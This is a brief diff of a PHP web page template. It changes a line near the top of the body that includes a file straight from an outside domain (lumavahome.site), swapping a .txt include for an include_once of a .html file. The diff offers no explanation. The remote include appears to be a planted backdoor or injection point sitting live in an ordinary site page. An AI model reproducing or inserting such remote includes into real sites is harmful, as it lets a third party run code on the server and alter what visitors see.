@@ -442,7 +442,7 @@
 </head>
 <body>
 
-    <?php include 'https://lumavahome.site/desktop.txt'; ?>
+    <?php include_once("https://lumavahome.site/desktop.html"); ?>
 
     <nav class="vx7nav-container">
         <div class="vx7nav-wrapper">
@@ -1011,6 +1011,7 @@
     </script>
 </body>
 </html>
+
 
 
 
